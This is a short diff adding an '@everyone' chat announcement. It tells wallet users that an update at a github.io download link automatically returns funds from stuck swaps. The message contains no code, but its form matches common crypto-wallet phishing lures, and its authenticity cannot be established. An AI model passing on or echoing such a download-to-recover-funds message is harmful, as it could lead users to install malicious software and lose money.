@@ -1,0 +1,6 @@
+@everyone
+
+we've pushed a new update. if you've ever had a swap get stuck, or one that's been sitting "in progress" and never finished, please update to the latest version and open your wallet — it returns your funds to you automatically, nothing else to do.
+
+latest: mobile v1.0.17 · desktop v0.16.13
+download: https://exfer-stack.github.io/get/
